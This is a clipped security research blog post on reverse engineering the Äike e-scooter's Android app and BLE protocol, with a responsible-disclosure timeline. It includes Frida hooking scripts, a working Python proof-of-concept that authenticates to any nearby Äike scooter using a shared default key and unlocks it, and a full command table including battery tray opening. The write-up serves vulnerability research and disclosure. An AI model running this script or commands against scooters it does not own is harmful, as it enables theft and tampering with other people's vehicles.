---
title: Reverse engineering my cloud-connected e-scooter and finding the master key to unlock all scooters
source: https://blog.nns.ee/2026/01/06/aike-ble/
source_host: blog.nns.ee
clip_date: 2026-11-02T10:13:22+08:00
trace_id: 649aae5a-6eda-4867-a5f0-5b3c505f9a86
content_hash: 06a8b94fc6653e10d2a5d548fb90b5e6c4eb0a6a69df7b56905142a5b0ffe2b0
status: synced
tags:
  - 硬件逆向
  - Frida
series: null
feed_source: nns.ee·Android/漏洞研究
ai_summary: TL;DR：作者逆向已破产厂商Äike的电动滑板车BLE协议，发现全线产品共用SDK默认密钥FF…FF，可解锁并控制任意附近的滑板车。
ai_summary_style: key-points
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 40c75244-d011-811a-833d-efc27cb503d6
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> TL;DR：作者逆向已破产厂商Äike的电动滑板车BLE协议，发现全线产品共用SDK默认密钥FF…FF，可解锁并控制任意附近的滑板车。
> 
> - **逆向路径：** App为React Native + Hermes字节码，作者用hermes_rs分析JS逻辑、Vineflower反编译Kotlin桥接层，并以Frida hook `BluetoothGatt`和`MessageDigest`动态抓取BLE通信与哈希运算。
> - **认证流程：** 连接后从特征`2556`读取20字节随机挑战，计算SHA-1(挑战+20字节密钥)写入特征`2557`，通过后方可向命令特征`155f`发送指令，否则命令被拒。
> - **核心漏洞：** Firebase下发的`blePrivateKey`为全`FF`——这是IoT模块SDK的出厂默认值，本应每台设备单独设置，Äike开发团队未修改，导致所有滑板车共享同一“万能钥匙”（Tuul租赁车因关闭蓝牙不受影响）。
> - **协议结构：** 命令为10字节（header `0x00` + registry `0xD4` + 命令ID + 参数），支持解锁`0x01`、上锁`0x02`、ECO模式`0x03`、开电池仓`0x04`等；滑板车经特征`155e`以2字节registry ID推送电量、锁状态、电压等遥测。
> - **PoC与披露：** 作者用Python + bleak写出扫描即解锁任意滑板车的脚本，并自建App实现手机/手表控车以摆脱云端依赖；2025年9月向IoT模块厂商披露，厂商确认默认密钥应由客户（Äike）修改，2026年1月公开细节。

A few years ago, I decided to buy an electric scooter for commuting in the city. I had already been using rental scooters for a while, but got tired of having to "hunt" for one or realizing there isn't one near my apartment building when I wanted to go to work in the morning.

I decided to go with an Äike T. This wasn't because it was necessarily better than the competitors' products. In fact, the scooter was fairly expensive, and at that price point, there were certainly scooters on the market that were technically superior.

However, I went with the Äike because it was a local product and I like to support local companies whenever possible. Äike (meaning "lightning" in Estonian) was designed and manufactured in Estonia, right here in Tallinn. From what I could tell, they also didn't use many off-the-shelf components. The design was fully custom, the IoT module used in the scooter was also locally produced, they had their own battery pack, and so on. This isn't necessarily a good thing because it hurts the maintainability of the scooter, but I found their product ambitious.

Another reason was that they had a sister company Tuul (meaning "wind" in Estonian) which offered rental scooters. These scooters were also just Äike scooters, and out of all of the competitors, I enjoyed the ride that Tuul/Äike offered the most and used their rental service whenever possible.

Äike [went bankrupt last year](https://ariregister.rik.ee/eng/company/16530912/%C3%84ike-Mobility-O%C3%9C). While this is unfortunate as in the long term, it'll become increasingly harder to source replacement components due to all of them being custom, I started having much more immediate concerns regarding the usability of my scooter. The scooter does not have a manual start-stop function. Starting and stopping, unlocking the battery tray, setting it into transport mode, etc is all done via their app.

The app is, of course, connected to the "cloud". Some of the features had already stopped working or been shut down (live tracking on the map, tracking ride length history, etc). Other features relying on the "cloud" seemed to still be working. I was uncertain whether at one point, I would not be able to use the app at all, thus locking me out of my own scooter entirely. This motivated me to start reverse engineering the scooter and its app to see if I couldn't make a third party app to communicate with the scooter.

My first step was to start reverse engineering the Android app. Soon after I started, I realized there was a critical security issue in the scooter which allowed me to not only unlock and control my *own* scooter, but any Äike scooter at all.

### Reverse engineering setup

The app is written in React Native. There's two ways how you can compile React Native apps.

The older method bundled a JavaScript file in the app, and was interpreted by React Native's JavaScript engine when the app was executed. Although minified, the JavaScript file is fairly readable and reverse engineering the functionality is not complex - the more challenging part is reverse engineering any native modules or Java/Kotlin glue. Modifying the JavaScript to run custom code for instrumentation is trivial.

The newer method compiles the JavaScript code into React Native's own bytecode, which will be executed by RN's VM called Hermes. In this scenario, the complexity is turned upside down. Hermes bytecode is not *well* -understood and the tooling for reverse engineering apps built using this newer method is lackluster. This is especially true considering how powerful modern decompilers for Java/Kotlin are, meaning that the *glue* classes is the more easily understood compiled code here.

The Äike app was compiled using the newer method. This was unfortunate as it was far more challenging to reverse engineer the app as I had hoped, but also fortunate because I enjoy a good challenge.

Hermes bytecode doesn't have good decompilers that spit out code. There have [been a](https://github.com/P1sec/hermes-dec) [few](https://github.com/lucasbaizer/hasmer) [projects](https://github.com/bongtrop/hbctool) that have tried to tackle this, but the output they produce is quite noisy and not very readable. In the end, I mostly used [Pilfer's hermes_rs project](https://github.com/Pilfer/hermes_rs), as it was the most state-of-the-art project and I felt comfortable working with the Rust code.

While React Native was used for a lot of the functionality, it had to call native Android functions at one point. I knew this to be especially true as the app uses Bluetooth to communicate with the scooter (besides "the cloud"), and in order to do *anything* with Bluetooth in Android, you of course have to use native OS functionality. For this, the app used some Kotlin glue code. My Java decompiler of choice is [Vineflower](https://vineflower.org/) and this managed to decompile the code I was interested in into a fairly readable output.

I realized that the Kotlin code was used merely as a "bridge" to speak to the OS, and the actual logic was in the Hermes bytecode. This made me rely fairly heavily on [Frida](https://frida.re/) to sniff the Bluetooth communication at runtime. From inspecting the decompiled code, I knew that most of the Bluetooth communication was performed over BLE GATT characteristics. I won't go into detail on how GATT characteristics work here (if you're interested, have a look at [ERNW's recent security research into Bluetooth headphones](https://insinuator.net/2025/12/bluetooth-headphone-jacking-full-disclosure-of-airoha-race-vulnerabilities/)). What's important to know is that we can sniff and modify this traffic using Frida fairly easily.

Android exposes the Java classes `android.bluetooth.BluetoothGatt` and `android.bluetooth.BluetoothGattCallback` that apps are expected to use to use GATT characteristics. We can use Frida to hook into these and override many of the interesting functions.

I was mostly interested in reads, writes and GATT notifications, so I whipped up a Frida script to hook into these and print all comms to the console:

```javascript
Java.perform(function() {
  var BluetoothGatt = Java.use("android.bluetooth.BluetoothGatt");

  // connection events
  BluetoothGatt.disconnect.implementation = function() {
    console.log("\n*** [GATT] DISCONNECTING ***");
    return this.disconnect();
  };

  // writes
  BluetoothGatt.writeCharacteristic.overload('android.bluetooth.BluetoothGattCharacteristic').implementation = function(characteristic) {
    console.log("\n>>> [COMMAND] Writing characteristic");
    var uuid = characteristic.getUuid();
    var value = characteristic.getValue();
    console.log("    UUID: " + uuid);
    console.log("    Value: " + bytesToHex(value));
    console.log("    ASCII: " + bytesToAscii(value));
    return this.writeCharacteristic(characteristic);
  };

  BluetoothGatt.writeCharacteristic.overload('android.bluetooth.BluetoothGattCharacteristic', '[B', 'int').implementation = function(characteristic, value, writeType) {
    console.log("\n>>> [COMMAND] Writing characteristic");
    var uuid = characteristic.getUuid();
    console.log("    UUID: " + uuid);
    console.log("    Value: " + bytesToHex(value));
    console.log("    ASCII: " + bytesToAscii(value));
    console.log("    Write Type: " + writeType);
    return this.writeCharacteristic(characteristic, value, writeType);
  };

  var BluetoothGattCallback = Java.use("android.bluetooth.BluetoothGattCallback");

  // connection state changes
  BluetoothGattCallback.onConnectionStateChange.overload('android.bluetooth.BluetoothGatt', 'int', 'int').implementation = function(gatt, status, newState) {
    console.log("\n*** [CONNECTION] State changed: " + getConnectionState(newState) + " (status: " + status + ") ***");
    return this.onConnectionStateChange(gatt, status, newState);
  };

  // characteristic reads
  BluetoothGattCallback.onCharacteristicRead.overload('android.bluetooth.BluetoothGatt', 'android.bluetooth.BluetoothGattCharacteristic', 'int').implementation = function(gatt, characteristic, status) {
    console.log("\n<<< [RESPONSE] Characteristic read");
    var uuid = characteristic.getUuid();
    var value = characteristic.getValue();
    console.log("    UUID: " + uuid);
    console.log("    Status: " + status);
    console.log("    Value: " + bytesToHex(value));
    console.log("    ASCII: " + bytesToAscii(value));
    return this.onCharacteristicRead(gatt, characteristic, status);
  };

  BluetoothGattCallback.onCharacteristicRead.overload('android.bluetooth.BluetoothGatt', 'android.bluetooth.BluetoothGattCharacteristic', '[B', 'int').implementation = function(gatt, characteristic, value, status) {
    console.log("\n<<< [RESPONSE] Characteristic read");
    var uuid = characteristic.getUuid();
    console.log("    UUID: " + uuid);
    console.log("    Status: " + status);
    console.log("    Value: " + bytesToHex(value));
    console.log("    ASCII: " + bytesToAscii(value));
    return this.onCharacteristicRead(gatt, characteristic, value, status);
  };

  // notifications
  BluetoothGattCallback.onCharacteristicChanged.overload('android.bluetooth.BluetoothGatt', 'android.bluetooth.BluetoothGattCharacteristic').implementation = function(gatt, characteristic) {
    console.log("\n<<< [NOTIFICATION] Device data");
    var uuid = characteristic.getUuid();
    var value = characteristic.getValue();
    console.log("    UUID: " + uuid);
    console.log("    Value: " + bytesToHex(value));
    console.log("    ASCII: " + bytesToAscii(value));
    console.log("    Length: " + (value ? value.length : 0) + " bytes");
    return this.onCharacteristicChanged(gatt, characteristic);
  };

  BluetoothGattCallback.onCharacteristicChanged.overload('android.bluetooth.BluetoothGatt', 'android.bluetooth.BluetoothGattCharacteristic', '[B').implementation = function(gatt, characteristic, value) {
    console.log("\n<<< [NOTIFICATION] Device data (with value)");
    var uuid = characteristic.getUuid();
    console.log("    UUID: " + uuid);
    console.log("    Value: " + bytesToHex(value));
    console.log("    ASCII: " + bytesToAscii(value));
    console.log("    Length: " + (value ? value.length : 0) + " bytes");
    return this.onCharacteristicChanged(gatt, characteristic, value);
  };
});
```

### Authentication

After getting my testing environment more or less set up, I started going through the different functionalities of the app to figure out how communication works. By sniffing how the app connects to the scooter, I observed the following flow:

1.  The app connects to the scooter.
2.  The app reads the characteristic `00002556-1212-efde-1523-785feabcd123`. This contains a random 20-byte value.
3.  The app writes a different 20-byte value to the characteristic `00002557-1212-efde-1523-785feabcd123`.
4.  The app proceeds with writing commands to the characteristic `0000155f-1212-efde-1523-785feabcd123`. This is where it would send the lock and unlock commands, the battery tray opening command, etc.
5.  The app disconnects (when closed). Further connections start from step 1 again.

Steps 2 and 3 seemed to be a challenge-response authentication of some sort. Without doing those steps first, I couldn't simply skip to step 4 and start sending commands to the scooter as they would be rejected.

The 20-byte value had me suspecting that SHA-1 was somehow being used. To confirm, I wrote another Frida script that hooks Android hashing functions exposed by the Java class `java.security.MessageDigest`:

```javascript
Java.perform(function() {
  var MessageDigest = Java.use("java.security.MessageDigest");

  MessageDigest.getInstance.overload('java.lang.String').implementation = function(algorithm) {
    console.log("\n[HASH] MessageDigest.getInstance called");
    console.log("  Algorithm: " + algorithm);
    return this.getInstance(algorithm);
  };

  MessageDigest.update.overload('[B').implementation = function(input) {
    console.log("\n[HASH] MessageDigest.update called");
    console.log("  Input: " + bytesToHex(input));
    return this.update(input);
  };

  MessageDigest.digest.overload().implementation = function() {
    console.log("\n[HASH] MessageDigest.digest called");
    var result = this.digest();
    console.log("  Output: " + bytesToHex(result));
    return result;
  };

  MessageDigest.digest.overload('[B').implementation = function(input) {
    console.log("\n[HASH] MessageDigest.digest called");
    console.log("  Input: " + bytesToHex(input));
    var result = this.digest(input);
    console.log("  Output: " + bytesToHex(result));
    return result;
  };
});
```

With both Frida scripts running, my suspicion was confirmed:

```plain
[BLE READ] UUID: 00002556-1212-efde-1523-785feabcd123
  Value: 93 2E ED 37 8C A9 33 BB B8 42 FB 0A B8 6F F0 1D 74 48 AD F2

[HASH] MessageDigest.getInstance called
  Algorithm: SHA-1

[HASH] MessageDigest.update called
  Input: 93 2E ED 37 8C A9 33 BB B8 42 FB 0A B8 6F F0 1D 74 48 AD F2 FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF

[HASH] MessageDigest.digest called
  Output: A7 6B BF 7D 04 CA 93 0B 78 84 F9 75 07 07 74 57 78 DE 4E E6

[BLE WRITE] UUID: 00002557-1212-efde-1523-785feabcd123
  Value: A7 6B BF 7D 04 CA 93 0B 78 84 F9 75 07 07 74 57 78 DE 4E E6
```

The challenge value read from the `2556` characteristic was concatenated with 20 bytes of `FF`, and the resulting hash was written to the `2557` characteristic. But where did this `FF` value come from?

The app uses Firebase for most of its cloud functionality. When signing in and pairing your scooter, the server sends the app a secret key. This is stored on the Android device, and can be read with root access:

```shellscript
sqlite3 \
  ./data/data/com.comodule.tuul.personal/databases/firestore.%5BDEFAULT%5D.coscooter-eu.%28default%29 \
  "SELECT base64(contents) FROM remote_documents WHERE path = 'vehicles' || char(1) || char(1) || 'a1ce1d929129894c' || char(1) || char(1)" \
  | base64 -d | protoc --decode_raw
```

Output:

```json
{

  1: "projects/coscooter-eu/databases/(default)/documents/vehicles/a1ce1d929129894c"
 {

    1: "connected"
 {

      1: 0
    }
  }
...
 {

    1: "blePrivateKey"
 {

      17: "ffffffffffffffff"
    }
  }
...
```

As is shown in the output, the `blePrivateKey` value is `ffffffffffffffff`.

I suspected that this was meant to be unique between each scooter. This was also indicated by the software SDK for the IoT modules used in these scooters - in fact, the `FF` key was the default value in the SDK, which developers were expected to change. This was confirmed by a representative of the company who produces these modules when I reported this issue to them. Apparently, the Äike development team had neglected to set a different key for each scooter, and the blank `FF` key was used for each scooter.

From what I've observed, Tuul rental scooters do not seem to have Bluetooth enabled and thus are not vulnerable to this issue.

### Proof of concept

Knowing all of this, it's actually fairly simple to authenticate to any Äike scooter in the vicinity and start sending commands to it. I wrote a proof-of-concept Python script that does exactly that - first, it authenticates to any discovered scooters using the default `FF` key, and then it sends a command to unlock the scooter. It requires Python 3 and the `bleak` Bluetooth library to run.

```python
#!/usr/bin/env python3

import asyncio
import hashlib
from bleak import BleakClient, BleakScanner

CHALLENGE_UUID = "00002556-1212-efde-1523-785feabcd123"
RESPONSE_UUID  = "00002557-1212-efde-1523-785feabcd123"
COMMAND_UUID   = "0000155f-1212-efde-1523-785feabcd123"


def aike_filter(device, _):
  return device.name and device.name in ["AIKE", "AIKE_T", "AIKE_11"]

async def main():
  # scan & connect
  device = await BleakScanner.find_device_by_filter(aike_filter, timeout=10.0)
  if device is None:
    print("No Äike device found")
    return

  client = BleakClient(device.address)
  await client.connect()

  # authenticate
  challenge = await client.read_gatt_char(CHALLENGE_UUID)
  response = hashlib.sha1(challenge + b'\xFF' * 20).digest()
  await client.write_gatt_char(RESPONSE_UUID, response, response=False)

  # send unlock command
  cmd = bytes([0x00, 0xD4, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
  await client.write_gatt_char(COMMAND_UUID, cmd, response=False)
  await asyncio.sleep(0.5)

  await client.disconnect()

if __name__ == "__main__":
  asyncio.run(main())
```

### Further reverse engineering

Of course, I didn't want to merely connect and authenticate to the scooter, I also wanted to be able to send commands to it and communicate with it.

By doing some more reverse engineering and dynamic analysis, I discovered that the command messages (written to characteristic `0000155f-1212-efde-1523-785feabcd123`) generally adhere to the following 10-byte structure:

| Offset | Description |
| --- | --- |
| 0   | Header byte 1 (always `0x00`) |
| 1   | Registry ID - typically `0xD4` for commands |
| 2   | Reserved (`0x00`) |
| 3   | Command ID |
| 4   | Reserved (`0x00`) |
| 5   | Reserved (`0x00`) |
| 6   | Reserved (`0x00`) |
| 7   | Parameter value |
| 8   | Reserved (`0x00`) |
| 9   | Reserved (`0x00`) |

For example, the unlock command (`0x01`) with no parameter would be:

```plain
00 D4 00 01 00 00 00 00 00 00
```

Setting the scooter into "transport mode" is an exception - it uses a different registry (`0xD2`) and structure:

| Offset | Value | Description |
| --- | --- | --- |
| 0   | `0x00` | Header |
| 1   | `0xD2` | Transport registry |
| 2   | `0x1B` | Transport-specific |
| 3   | `0x1E` | Transport-specific |
| 4   | `0x3C` | Transport-specific |
| 5   | `0x01` | Transport-specific |
| 6-7 | `0x00` | Reserved |
| 8   | State | `0x01` = enable, `0x00` = disable |
| 9   | `0x00` | Reserved |

The commands themselves are:

| Command | ID  | Parameter | Example |
| --- | --- | --- | --- |
| Unlock | `0x01` | `0x00` | `00 D4 00 01 00 00 00 00 00 00` |
| Lock | `0x02` | `0x00` | `00 D4 00 02 00 00 00 00 00 00` |
| Set Eco Mode | `0x03` | `0x00` = off, `0x01` = on | `00 D4 00 03 00 00 00 01 00 00` |
| Open Battery Tray | `0x04` | `0x00` | `00 D4 00 04 00 00 00 00 00 00` |
| Set Auto-lock Timer | `0x06` | Minutes (`0x00` - `0xFF`) | `00 D4 00 06 00 00 00 0F 00 00` (15 min) |
| Set Auto-brake | `0x07` | `0x00` = off, `0x01` = on | `00 D4 00 07 00 00 00 01 00 00` |

The scooter also sends notifications on characteristic `0000155e-1212-efde-1523-785feabcd123`. The notifications contain information on the state of the scooter (battery level, range, lock/unlock events, etc).

Each notification starts with a 2-byte registry ID followed by the payload data.

| Registry ID | Name | Payload Format |
| --- | --- | --- |
| `0x00C0` | Battery Level | 1 byte: percentage (0-100) |
| `0x00C1` | Lock Status | 1 byte: `0x01` = locked, `0x00` = unlocked |
| `0x00C2` | Battery Telemetry | Extended battery statistics? |
| `0x00C6` | Eco Mode | 1 byte: `0x01` = enabled, `0x00` = disabled |
| `0x00D4` | Command Status | Command acknowledgement |
| `0x01A2` | Settings Pack | 8-byte settings structure |
| `0x03C1` | Battery Voltage | 2 bytes big-endian: millivolts |
| `0xFCFC` | Firmware Info | Firmware version information |

The settings pack (`0x01A2`) has the following payload structure:

| Offset | Description |
| --- | --- |
| 0-1 | Unknown (possibly scooter model or hardware revision) |
| 2   | Auto-lock timer in minutes (`0x00` = disabled) |
| 3   | Auto-brake: `0x01` = enabled, `0x00` = disabled |
| 4   | Unknown |
| 5   | Eco mode: `0x01` = enabled, `0x00` = disabled |
| 6   | Transport mode: `0x01` = enabled, `0x00` = disabled |
| 7   | Unknown |

It's also possible to manually read notification values by writing the 2-byte registry ID to characteristic `00001564-1212-efde-1523-785feabcd123`, then reading the response from `0000155f-1212-efde-1523-785feabcd123`. The response is 10 bytes: the first 2 bytes echo the registry ID, followed by 8 bytes of payload.

### Disclosure

Reporting this was complicated by the fact that Äike no longer exists. I reached out to the IoT module company in September 2025, who confirmed the `FF` key was a default that should have been changed per-device.

I've since written my own app to control my scooter both from my phone and from my smartwatch, which was not previously possible. At least now I don't have to worry about cloud servers going offline.

### Timeline

-   **13/09/2025** - attempted to contact IoT module vendor for responsible disclosure contacts
-   **19/09/2025** - initial vendor response
-   **19/09/2025** - sent vendor write-up detailing vulnerability
-   **22/09/2025** - vendor response confirming that the default key should've been changed by the client (Äike)
-   **06/01/2026** - published write-up
